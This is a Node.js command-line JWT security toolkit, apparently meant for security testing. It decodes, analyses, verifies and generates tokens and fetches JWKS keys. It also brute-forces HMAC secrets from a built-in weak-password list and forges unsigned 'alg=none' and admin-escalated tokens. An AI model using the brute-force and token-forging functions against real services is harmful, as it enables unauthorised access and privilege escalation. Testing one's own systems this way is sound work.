// JWT Security Toolkit in Node.js
// Install: npm install jsonwebtoken crypto axios
// Usage: node jwt_security.js [command] [options]
// Example: node jwt_security.js decode <token>

const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const axios = require('axios');
const fs = require('fs');

class JWTSecurityToolkit {
    constructor() {
        this.commonSecrets = [
            'secret', 'password', '123456', 'admin', 'test', 'key',
            'jwt_secret', 'your-256-bit-secret', 'mysecret', 'secretkey',
            'default', 'changeme', 'qwerty', 'letmein', 'welcome'
        ];
    }

    decodeToken(token) {
        try {
            console.log('[+] Decoding JWT token...');
            
            const decoded = jwt.decode(token, { complete: true });
            
            if (!decoded) {
                console.log('[!] Invalid JWT token format');
                return null;
            }
            
            console.log('\n=== JWT Header ===');
            console.log(JSON.stringify(decoded.header, null, 2));
            
            console.log('\n=== JWT Payload ===');
            console.log(JSON.stringify(decoded.payload, null, 2));
            
            // Security analysis
            this.analyzeToken(decoded);
            
            return decoded;
        } catch (error) {
            console.error('[!] Error decoding JWT:', error.message);
            return null;
        }
    }

    analyzeToken(decoded) {
        console.log('\n=== Security Analysis ===');
        
        // Check algorithm
        const alg = decoded.header.alg;
        console.log(`Algorithm: ${alg}`);
        
        if (alg === 'none') {
            console.log('[!] CRITICAL: Algorithm is "none" - no signature verification!');
        } else if (alg.startsWith('HS')) {
            console.log('[!] WARNING: HMAC algorithm - vulnerable to brute force attacks');
        } else if (alg.startsWith('RS') || alg.startsWith('ES')) {
            console.log('[+] Good: Using asymmetric algorithm');
        }
        
        // Check expiration
        const payload = decoded.payload;
        if (payload.exp) {
            const expDate = new Date(payload.exp * 1000);
            const now = new Date();
            const timeLeft = expDate - now;
            
            console.log(`Expiration: ${expDate}`);
            if (now > expDate) {
                console.log('[!] Token is EXPIRED');
            } else {
                const hoursLeft = Math.floor(timeLeft / (1000 * 60 * 60));
                console.log(`[+] Token expires in ${hoursLeft} hours`);
            }
        } else {
            console.log('[!] WARNING: No expiration time set');
        }
        
        // Check issued at
        if (payload.iat) {
            const iatDate = new Date(payload.iat * 1000);
            console.log(`Issued at: ${iatDate}`);
        }
        
        // Check not before
        if (payload.nbf) {
            const nbfDate = new Date(payload.nbf * 1000);
            const now = new Date();
            if (now < nbfDate) {
                console.log('[!] Token is not yet valid');
            }
        }
        
        // Check for sensitive information
        const sensitiveFields = ['password', 'secret', 'key', 'token', 'api_key'];
        const payloadStr = JSON.stringify(payload).toLowerCase();
        
        sensitiveFields.forEach(field => {
            if (payloadStr.includes(field)) {
                console.log(`[!] WARNING: Potential sensitive data found: ${field}`);
            }
        });
        
        // Check scope/permissions
        if (payload.scope || payload.permissions || payload.roles) {
            console.log('[+] Token contains authorization information');
        }
    }

    async bruteForceSecret(token, wordlist = null) {
        console.log('[+] Attempting to brute force JWT secret...');
        
        const decoded = jwt.decode(token, { complete: true });
        if (!decoded || !decoded.header.alg.startsWith('HS')) {
            console.log('[!] Token is not using HMAC algorithm');
            return null;
        }
        
        let secrets = [...this.commonSecrets];
        
        // Add wordlist if provided
        if (wordlist && fs.existsSync(wordlist)) {
            const wordlistContent = fs.readFileSync(wordlist, 'utf8');
            const words = wordlistContent.split('\n').map(w => w.trim()).filter(w => w);
            secrets = [...secrets, ...words];
        }
        
        console.log(`Testing ${secrets.length} potential secrets...`);
        
        for (const secret of secrets) {
            try {
                jwt.verify(token, secret);
                console.log(`[+] SECRET FOUND: ${secret}`);
                return secret;
            } catch (error) {
                // Continue testing
            }
        }
        
        console.log('[!] Secret not found in wordlist');
        return null;
    }

    generateToken(payload, secret, algorithm = 'HS256', expiresIn = '1h') {
        try {
            console.log('[+] Generating JWT token...');
            
            const options = {
                algorithm: algorithm,
                expiresIn: expiresIn
            };
            
            const token = jwt.sign(payload, secret, options);
            
            console.log('\n=== Generated Token ===');
            console.log(token);
            
            console.log('\n=== Token Details ===');
            const decoded = jwt.decode(token, { complete: true });
            console.log('Header:', JSON.stringify(decoded.header, null, 2));
            console.log('Payload:', JSON.stringify(decoded.payload, null, 2));
            
            return token;
        } catch (error) {
            console.error('[!] Error generating token:', error.message);
            return null;
        }
    }

    verifyToken(token, secret, algorithm = 'HS256') {
        try {
            console.log('[+] Verifying JWT token...');
            
            const options = {
                algorithms: [algorithm]
            };
            
            const decoded = jwt.verify(token, secret, options);
            
            console.log('[+] Token is VALID');
            console.log('\n=== Verified Payload ===');
            console.log(JSON.stringify(decoded, null, 2));
            
            return decoded;
        } catch (error) {
            console.log('[!] Token verification FAILED:', error.message);
            return null;
        }
    }

    manipulateToken(token) {
        console.log('[+] Attempting token manipulation attacks...');
        
        const decoded = jwt.decode(token, { complete: true });
        if (!decoded) {
            console.log('[!] Invalid token');
            return;
        }
        
        console.log('\n=== Algorithm Confusion Attack ===');
        // Try changing algorithm to 'none'
        const noneHeader = { ...decoded.header, alg: 'none' };
        const noneToken = this.createUnsignedToken(noneHeader, decoded.payload);
        console.log('Token with alg=none:');
        console.log(noneToken);
        
        // Try changing HMAC to RSA
        if (decoded.header.alg.startsWith('HS')) {
            const rsaHeader = { ...decoded.header, alg: 'RS256' };
            const rsaToken = this.createUnsignedToken(rsaHeader, decoded.payload);
            console.log('\nToken with RS256 (for algorithm confusion):');
            console.log(rsaToken);
        }
        
        console.log('\n=== Payload Manipulation ===');
        // Try privilege escalation
        const adminPayload = { ...decoded.payload };
        if (adminPayload.role) {
            adminPayload.role = 'admin';
        }
        if (adminPayload.permissions) {
            adminPayload.permissions = ['admin', 'read', 'write', 'delete'];
        }
        if (adminPayload.scope) {
            adminPayload.scope = 'admin';
        }
        
        const adminToken = this.createUnsignedToken(decoded.header, adminPayload);
        console.log('Token with elevated privileges:');
        console.log(adminToken);
    }

    createUnsignedToken(header, payload) {
        const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
        const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
        
        if (header.alg === 'none') {
            return `${encodedHeader}.${encodedPayload}.`;
        } else {
            return `${encodedHeader}.${encodedPayload}.SIGNATURE_REMOVED`;
        }
    }

    async checkJWKS(jwksUrl) {
        try {
            console.log(`[+] Checking JWKS endpoint: ${jwksUrl}`);
            
            const response = await axios.get(jwksUrl);
            const jwks = response.data;
            
            console.log('\n=== JWKS Response ===');
            console.log(JSON.stringify(jwks, null, 2));
            
            if (jwks.keys && jwks.keys.length > 0) {
                console.log(`\n[+] Found ${jwks.keys.length} key(s)`);
                
                jwks.keys.forEach((key, index) => {
                    console.log(`\nKey ${index + 1}:`);
                    console.log(`  Key Type: ${key.kty}`);
                    console.log(`  Algorithm: ${key.alg}`);
                    console.log(`  Use: ${key.use}`);
                    console.log(`  Key ID: ${key.kid}`);
                    
                    if (key.x5c) {
                        console.log(`  Certificate Chain: ${key.x5c.length} certificate(s)`);
                    }
                });
            }
            
            return jwks;
        } catch (error) {
            console.error('[!] Error fetching JWKS:', error.message);
            return null;
        }
    }

    generateKeyPair() {
        console.log('[+] Generating RSA key pair for JWT signing...');
        
        const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
            modulusLength: 2048,
            publicKeyEncoding: {
                type: 'spki',
                format: 'pem'
            },
            privateKeyEncoding: {
                type: 'pkcs8',
                format: 'pem'
            }
        });
        
        console.log('\n=== Private Key ===');
        console.log(privateKey);
        
        console.log('\n=== Public Key ===');
        console.log(publicKey);
        
        // Save to files
        fs.writeFileSync('jwt_private_key.pem', privateKey);
        fs.writeFileSync('jwt_public_key.pem', publicKey);
        
        console.log('\n[+] Keys saved to jwt_private_key.pem and jwt_public_key.pem');
        
        return { publicKey, privateKey };
    }
}

function printUsage() {
    console.log('JWT Security Toolkit');
    console.log('Usage: node jwt_security.js [command] [options]\n');
    console.log('Commands:');
    console.log('  decode <token>                       - Decode and analyze JWT token');
    console.log('  verify <token> <secret> [algorithm]  - Verify JWT token with secret');
    console.log('  brute <token> [wordlist]             - Brute force JWT secret');
    console.log('  generate <payload> <secret> [alg]    - Generate JWT token');
    console.log('  manipulate <token>                   - Test token manipulation attacks');
    console.log('  jwks <url>                           - Check JWKS endpoint');
    console.log('  keygen                               - Generate RSA key pair');
    console.log('\nExamples:');
    console.log('  node jwt_security.js decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
    console.log('  node jwt_security.js verify <token> mysecret');
    console.log('  node jwt_security.js brute <token> wordlist.txt');
    console.log('  node jwt_security.js generate \'{"user":"admin"}\' mysecret');
    console.log('  node jwt_security.js jwks https://example.com/.well-known/jwks.json');
}

async function main() {
    if (process.argv.length < 3) {
        printUsage();
        process.exit(1);
    }

    const command = process.argv[2];
    const toolkit = new JWTSecurityToolkit();

    try {
        switch (command) {
            case 'decode':
                if (process.argv.length < 4) {
                    console.log('Usage: decode <token>');
                    process.exit(1);
                }
                toolkit.decodeToken(process.argv[3]);
                break;
                
            case 'verify':
                if (process.argv.length < 5) {
                    console.log('Usage: verify <token> <secret> [algorithm]');
                    process.exit(1);
                }
                const algorithm = process.argv[5] || 'HS256';
                toolkit.verifyToken(process.argv[3], process.argv[4], algorithm);
                break;
                
            case 'brute':
                if (process.argv.length < 4) {
                    console.log('Usage: brute <token> [wordlist]');
                    process.exit(1);
                }
                const wordlist = process.argv[4] || null;
                await toolkit.bruteForceSecret(process.argv[3], wordlist);
                break;
                
            case 'generate':
                if (process.argv.length < 5) {
                    console.log('Usage: generate <payload> <secret> [algorithm]');
                    process.exit(1);
                }
                const payload = JSON.parse(process.argv[3]);
                const secret = process.argv[4];
                const alg = process.argv[5] || 'HS256';
                toolkit.generateToken(payload, secret, alg);
                break;
                
            case 'manipulate':
                if (process.argv.length < 4) {
                    console.log('Usage: manipulate <token>');
                    process.exit(1);
                }
                toolkit.manipulateToken(process.argv[3]);
                break;
                
            case 'jwks':
                if (process.argv.length < 4) {
                    console.log('Usage: jwks <url>');
                    process.exit(1);
                }
                await toolkit.checkJWKS(process.argv[3]);
                break;
                
            case 'keygen':
                toolkit.generateKeyPair();
                break;
                
            default:
                console.log(`Unknown command: ${command}`);
                printUsage();
                break;
        }
    } catch (error) {
        console.error('Error:', error.message);
    }
}

if (require.main === module) {
    main();
}

module.exports = JWTSecurityToolkit;
